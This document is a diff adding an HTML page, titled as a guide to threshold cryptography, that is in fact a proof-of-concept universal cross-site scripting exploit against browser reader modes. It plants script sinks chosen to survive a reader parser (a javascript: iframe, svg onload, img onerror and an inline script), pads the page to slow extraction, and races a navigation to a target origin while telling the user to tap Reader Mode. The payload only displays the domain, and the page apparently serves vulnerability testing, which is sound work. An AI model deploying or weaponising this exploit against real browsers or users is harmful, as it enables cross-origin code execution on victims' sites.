@@ -1,0 +1,86 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>The Long Guide to Threshold Cryptography — A Benign Reader Article</title>
+<meta name="author" content="Research Desk">
+<style>
+ :root{color-scheme:light dark}
+ body{margin:0;font-family:system-ui,sans-serif}
+ #source{max-width:760px;margin:24px auto;line-height:1.5;padding:0 16px}
+ #cover{position:fixed;inset:0;z-index:10;display:grid;place-items:center;background:Canvas}
+ #cue{padding:16px 26px;border:0;border-radius:14px;background:#555;color:#fff;font:700 18px system-ui}
+ #cue.go{background:#c00020}
+ .keepframe{width:1px;height:1px;border:0}
+ svg{width:1px;height:1px}
+</style>
+</head>
+<body>
+<article id="source">
+ <h1>The Long Guide to Threshold Cryptography</h1>
+ <p><em>Benign reader-UXSS probe. Neutral markers only — proves cross-origin execution via
+    <code>document.domain</code>; it does NOT read cookies or any user data.</em></p>
+
+ <!-- SINK 1: javascript: iframe, kept by Mercury/Postlight parser (mercury-parser-keep) -->
+ <iframe class="mercury-parser-keep keepframe"
+   src="javascript:(()=>{try{var d=parent.document;var o=parent.location.origin;parent.__rpoc&&parent.__rpoc('js-iframe',o,d)}catch(e){}})()"></iframe>
+
+ <!-- SINK 2: svg onload kept -->
+ <svg class="mercury-parser-keep" xmlns="http://www.w3.org/2000/svg" onload="try{window.__rpoc&&window.__rpoc('svg-onload',location.origin,document)}catch(e){}"></svg>
+
+ <!-- SINK 3: img onerror kept -->
+ <img class="mercury-parser-keep" src="x" alt=""
+   onerror="try{window.__rpoc&&window.__rpoc('img-onerror',location.origin,document)}catch(e){}">
+
+ <!-- SINK 4: inline script kept -->
+ <script class="mercury-parser-keep">try{window.__rpoc&&window.__rpoc('inline-script',location.origin,document)}catch(e){}</script>
+
+ <p id="padding"></p>
+</article>
+
+<div id="cover"><button id="cue" type="button" disabled>WAIT</button></div>
+
+<script>
+(() => {
+  const params = new URLSearchParams(location.search);
+  const num = (n, def, min, max) => { const v = Number(params.get(n)); return Number.isFinite(v) ? Math.min(max, Math.max(min, v)) : def; };
+  // target = the origin whose context we try to make the reader inherit (nav-race).
+  // Use a hanging port so the navigation stays pending and content is extracted.
+  // Default is benign/illustrative; set ?target= to an origin you're authorized to test.
+  const target = params.get('target') || 'https://example.com:88';
+  const delay = num('delay', 15000, 5000, 60000);
+  const lead  = num('lead', 500, 100, 1200);
+  const cue = document.querySelector('#cue');
+
+  // BENIGN proof sink: shows which origin the code executed in. No cookie/data read.
+  window.__rpoc = function(sink, origin, doc){
+    const d = doc || document;
+    try {
+      d.open();
+      d.write('<!doctype html><meta name=viewport content="width=device-width,initial-scale=1">' +
+        '<title>reader uxss proof</title>' +
+        '<body style="font-family:system-ui;padding:20px">' +
+        '<h1 style="color:#c00;margin:0 0 10px">BENIGN UXSS PROOF</h1>' +
+        '<p>executed via reader sink: <b>' + sink + '</b></p>' +
+        '<p>document.domain = <b>' + d.domain + '</b></p>' +
+        '<p>location.origin = <b>' + (origin || '(n/a)') + '</b></p>' +
+        '<p>window===top: <b>' + (window === top) + '</b></p>' +
+        '<p style="color:#555">If document.domain above is the TARGET victim host (not this ' +
+        'attacker origin), code ran cross-origin = UXSS. No cookies/data were read.</p>');
+      d.close();
+    } catch(e){}
+    try { alert('BENIGN UXSS PROOF — sink=' + sink + ' domain=' + d.domain); } catch(e){}
+  };
+
+  document.querySelector('#padding').textContent =
+    'Reader extraction padding keeps article conversion busy. '.repeat(19000);
+
+  setTimeout(() => { cue.textContent = 'TAP READER MODE NOW'; cue.classList.add('go'); }, delay - lead);
+  // nav-race: go to the hanging target so the pending origin becomes `target`,
+  // then the user taps Reader Mode and the reader view may inherit that origin.
+  setTimeout(() => { try { location.assign(target); } catch(e){} }, delay);
+})();
+</script>
+</body>
+</html>
